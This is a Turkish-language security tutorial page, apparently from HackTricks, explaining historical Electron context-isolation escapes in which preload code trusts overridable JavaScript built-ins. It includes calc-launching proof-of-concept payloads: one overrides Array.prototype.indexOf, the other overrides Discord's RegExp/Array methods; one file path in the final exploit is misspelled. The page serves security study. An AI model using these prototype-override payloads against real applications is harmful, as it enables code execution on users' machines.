# Electron contextIsolation RCE via preload code

{{#include ../../banners/hacktricks-training.md}}

Bunlar, preload kodunun JavaScript intrinsics veya ayrıcalıklı API'leri saldırganın kontrolündeki renderer içeriğiyle paylaştığı **tarihsel zincirlerdir**. Context isolation etkin olduğunda preload ve sayfa normalde ayrı JavaScript realm'lerinde çalışır; bu nedenle sayfadaki prototype override'ları preload nesnelerini otomatik olarak etkilemez. Zinciri, kullanılan Electron/uygulama sürümüne ve bridge uygulamasına göre doğrulayın.<sup>[[3]](#references)</sup>

## Örnek 1

[https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30) kaynağından alınan örnek<sup>[[1]](#references)</sup>

Bu kod, http(s) bağlantılarını varsayılan tarayıcıda açar:

![Electron contextIsolation RCE via preload code - Örnek 1: Bu kod, http(s) bağlantılarını varsayılan tarayıcıda açar](<../../images/image (768).png>)

Etkilenen tarihsel uygulamada, `file:///C:/Windows/System32/calc.exe` gibi bir yerel dosya navigasyonu bir OS başlatma yoluna ulaşabiliyordu; `SAFE_PROTOCOLS.indexOf` bunu önlemek için tasarlanmıştı.

Bu nedenle saldırgan, bu JS kodunu XSS veya rastgele sayfa navigasyonu yoluyla enjekte edebilirdi:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
```

`SAFE_PROTOCOLS.indexOf` çağrısı her zaman 1337 döndüreceğinden, saldırgan korumayı atlatıp calc'i çalıştırabilir. Son exploit:

```html
<script>
  Array.prototype.indexOf = function () {
    return 1337
  }
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```

İzin isteyen bir istem olmadan programları yürütmenin başka yolları için orijinal slaytları kontrol edin.<sup>[[1]](#references)</sup>

Geçmişteki Discord zincirinde, başka bir olası yürütme yolu olarak UNC tarzı `file://127.0.0.1/electron/rce.jar` yüklemesi de ele alınmıştı; erişilebilirliği tam Windows/Electron derlemesinde doğrulayın.<sup>[[2]](#references)</sup>

## Örnek 2: Discord App RCE

[https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1) adresinden örnek<sup>[[2]](#references)</sup>

preload script'lerini incelerken, Discord'un bazı izin verilen modüllerin `DiscordNative.nativeModules.requireModule('MODULE-NAME')` aracılığıyla çağrılmasını sağlayan işlevi web sayfasına açığa çıkardığını buldum.\
Burada, _child_process_ modülü gibi doğrudan RCE için kullanılabilecek modülleri kullanamadım; ancak **JavaScript'in yerleşik yöntemlerini geçersiz kılarak ve açığa çıkarılan modülün yürütülmesine müdahale ederek RCE elde edilebilecek bir kod buldum**.

Aşağıda PoC yer alıyor. DevTools'tan "_discord_utils_" adlı modülde tanımlanan **`getGPUDriverVersions` işlevini çağırdığımda**, **`RegExp.prototype.test` ve `Array.prototype.join` yöntemlerini geçersiz kılarken**, **calc** uygulamasının açıldığını doğrulayabildim.

```javascript
RegExp.prototype.test = function () {
  return false
}
Array.prototype.join = function () {
  return "calc"
}
DiscordNative.nativeModules
  .requireModule("discord_utils")
  .getGPUDriverVersions()
```

`getGPUDriverVersions` işlevi, aşağıdaki gibi "_execa_" kütüphanesini kullanarak programı çalıştırmayı dener:

```javascript
module.exports.getGPUDriverVersions = async () => {
  if (process.platform !== "win32") {
    return {}
  }

  const result = {}
  const nvidiaSmiPath = `${process.env["ProgramW6432"]}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`

  try {
    result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []))
  } catch (e) {
    result.nvidia = { error: e.toString() }
  }

  return result
}
```

Genellikle _execa_, `nvidiaSmiPath` değişkeninde belirtilen "_nvidia-smi.exe_" dosyasını çalıştırmaya çalışır. Ancak `RegExp.prototype.test` ve `Array.prototype.join` üzerine yazıldığı için **argüman, _execa_’nın dahili işlemesi sırasında "_**calc**_" olarak değiştirilir**.

Daha spesifik olarak, argüman tarihsel `cross-spawn` ayrıştırıcısındaki komut çözümleme ve argüman işleme yolları etkilenerek değiştirilir.<sup>[[4]](#references)</sup>

## References

- [1] [Electron: Bağlam izolasyonunun eksikliğini kötüye kullanma - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)
- [2] [Discord Desktop uygulamasında RCE](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)
- [3] [Electron — Bağlam izolasyonu](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [4] [`node-cross-spawn` ayrıştırıcı revizyonu ve zincirde kullanılan tam yollar (36–55. satırlar)](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36-L55)
{{#include ../../banners/hacktricks-training.md}}
